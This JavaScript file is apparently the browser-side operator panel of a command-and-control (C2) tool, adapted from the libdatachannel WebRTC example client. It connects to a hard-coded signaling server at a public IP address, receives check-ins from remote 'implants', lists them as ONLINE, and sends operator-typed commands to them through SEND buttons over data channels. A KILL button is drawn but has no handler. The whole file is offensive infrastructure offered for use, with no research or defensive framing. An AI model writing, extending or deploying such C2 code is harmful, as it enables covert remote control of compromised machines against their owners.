/*
 * libdatachannel example web client
 * Copyright (C) 2020 Lara Mackey
 * Copyright (C) 2020 Paul-Louis Ageneau
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; If not, see <http://www.gnu.org/licenses/>.
 */


window.addEventListener('load', () => {



//C2 Server ID
const localId = "6969";

//Signaling server
const url = `ws://73.4.243.143:8000/${localId}`;

//Stun server configuration
const config = {
  iceServers : [ {
    urls : 'stun:stun.l.google.com:19302',
  } ],
};

var connectedImplants = 0;

const peerConnectionMap = {};
const dataChannelMap = {};



//const offerId = document.getElementById('offerId');
//const offerBtn = document.getElementById('offerBtn');
const sendMsg = document.getElementById('sendMsg');
const cmd1Btn = document.getElementById('btn1');
const _localId = document.getElementById('localId');
//_localId.textContent = localId;

console.log('Connecting to signaling...');
openSignaling(url)
    .then((ws) => {
      console.log('WebSocket connected, signaling ready');
      // offerId.disabled = false;
      // offerBtn.disabled = false;
      // offerBtn.onclick = () => offerPeerConnection(ws, offerId.value);
    })
    .catch((err) => console.error(err));



function openSignaling(url) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(url);
    ws.onopen = () => resolve(ws);
    ws.onerror = () => reject(new Error('WebSocket error'));
    ws.onclose = () => console.error('WebSocket disconnected');
    ws.onmessage = (e) => {
      if (typeof (e.data) != 'string')
        return;
      const message = JSON.parse(e.data);
      console.log(message);
      const {id, type} = message;

      let pc = peerConnectionMap[id];
      if (!pc) {
        if (type != 'offer')
          return;

        // Create PeerConnection when received an offer
        console.log(`Answering to ${id}`);
        pc = createPeerConnection(ws, id);
      }

      switch (type) {
      case 'offer':

      case 'answer':
        pc.setRemoteDescription({
            sdp : message.description,
            type : message.type,
          }).then(() => {
          if (type == 'offer') {
            // Send answer
            sendLocalDescription(ws, id, pc, 'answer');
          }
        });
        break;

      case 'candidate':
        pc.addIceCandidate({
          candidate : message.candidate,
          sdpMid : message.mid,
        });
        break;
      }
    }
  });
}

function offerPeerConnection(ws, id) {
  // Create PeerConnection
  console.log(`Offering to ${id}`);
  pc = createPeerConnection(ws, id);

  // Create DataChannel
  const label = "test";
  console.log(`Creating DataChannel with label "${label}"`);
  const dc = pc.createDataChannel(label);
  setupDataChannel(dc, id);

  // Send offer
  sendLocalDescription(ws, id, pc, 'offer');
}

// Create and setup a PeerConnection
function createPeerConnection(ws, id) {
  const pc = new RTCPeerConnection(config);
  pc.oniceconnectionstatechange = () => console.log(`Connection state: ${pc.iceConnectionState}`);
  pc.onicegatheringstatechange = () => console.log(`Gathering state: ${pc.iceGatheringState}`);
  pc.onicecandidate = (e) => {
    if (e.candidate && e.candidate.candidate) {
      // Send candidate
      sendLocalCandidate(ws, id, e.candidate);
    }
  };
  pc.ondatachannel = (e) => {
    const dc = e.channel;
    console.log(`"DataChannel from ${id} received with label "${dc.label}"`);
    setupDataChannel(dc, id);

    //dc.send(`Hello from ${localId}`);
    
    sendMsg.disabled = false;
    //sendBtn.disabled = false;
      
    //sendBtn.onclick = () => dc.send(sendMsg.value);
  };

  peerConnectionMap[id] = pc;
  return pc;
}

//Interpret Message
function interpretMessage(message, dc){
  

  if (message.startsWith("check-in")){
    implantId = message.split(' ')[1];
    console.log('Implant checkin in');
    tableCreate(implantId, dc);
    // var myTable = document.getElementById('mainT');
    // var entry = document.createElement('tr');
    // entry.appendChild(document.createTextNode(implantId));
    // myTable.rows[1+connectedImplants].cells[0].innerHTML = implantId; 
    // myTable.rows[1+connectedImplants].cells[1].innerHTML = "ONLINE";
    // myTable.rows[1+connectedImplants].cells[2].innerHTML = "<button type='button' onclick='updateTextArea(" + '"' + + element.id + '"' + ")' >Add</button><br>";
  }
  var list = document.getElementById('messageTable');
  var entry = document.createElement('li');
  entry.appendChild(document.createTextNode(message));
  list.appendChild(entry);
  
}

// Setup a DataChannel
function setupDataChannel(dc, id) {
  dc.onopen = () => {
    console.log(`DataChannel from ${id} open`);

    sendMsg.disabled = false;
    // sendBtn.disabled = false;
    // sendBtn.onclick = () => dc.send(sendMsg.value);
  };
  dc.onclose = () => { console.log(`DataChannel from ${id} closed`); };
  dc.onmessage = (e) => {
    console.log('RECEIVED MESSAGE');
    if (typeof (e.data) != 'string')
      return;

    //Consumes message
    interpretMessage(e.data,dc);
    console.log(`Message from ${id} received: ${e.data}`);
    //document.body.appendChild(document.createTextNode(e.data));
  };

  dataChannelMap[id] = dc;
  return dc;
}

function sendLocalDescription(ws, id, pc, type) {
  (type == 'offer' ? pc.createOffer() : pc.createAnswer())
      .then((desc) => pc.setLocalDescription(desc))
      .then(() => {
        const {sdp, type} = pc.localDescription;
        ws.send(JSON.stringify({
          id,
          type,
          description : sdp,
        }));
      });
}

function sendLocalCandidate(ws, id, cand) {
  const {candidate, sdpMid} = cand;
  ws.send(JSON.stringify({
    id,
    type : 'candidate',
    candidate,
    mid : sdpMid,
  }));
}

// Helper function to generate a random ID
function randomId(length) {
  const characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  const pickRandom = () => characters.charAt(Math.floor(Math.random() * characters.length));
  return [...Array(length) ].map(pickRandom).join('');
}

});

//Helper function to create table with implants
function tableCreate(implantId, dc) {
  const body = document.body;
  const tbl = document.createElement('table');
  tbl.style.width = '80px';
  tbl.style.display = 'inline-table';
  tbl.style.border = '2px solid black';

  for (let i = 0; i < 3; i++) {
    const tr = tbl.insertRow();
    for (let j = 0; j < 2; j++) {
      if (i === 2 && j === 1) {
        break;

      } else if(i == 0 && j == 0) {
        const td = tr.insertCell();
        td.appendChild(document.createTextNode(`   ${implantId}`));
        td.style.border = '2px solid black';

      }else if(i == 0 && j == 1) {
        const td = tr.insertCell();
        td.appendChild(document.createTextNode(`ONLINE`));
        td.style.border = '2px solid black';

      }else if(i == 1 && j == 0) {
        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "SEND";
        btn.id = 'btn1'
        btn.style.color = 'green';
        function myfunction(dc){
          dc.send(sendMsg.value);
        }
          
        btn.onclick= () => myfunction(dc);
        btn.style.backgroundColor = 'black';
        td.appendChild(btn); 
        //td.appendChild(document.createTextNode(`+ Info`));
        td.style.border = '2px solid black';

      }else if(i == 2 && j == 0) {
        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "KILL";
        btn.style.color = 'red';
        btn.style.backgroundColor = 'black';
        td.appendChild(btn); 
        //td.appendChild(document.createTextNode(`+ Info`));


      } else {
        const td = tr.insertCell();
        td.appendChild(document.createTextNode(`Additional Information`));
        td.style.border = '2px solid black';
        if (i === 1 && j === 1) {
          td.setAttribute('rowSpan', '2');
        }
      }
    }
  }
  body.insertBefore(tbl, body.firstChild);
  //body.appendChild(tbl);
}

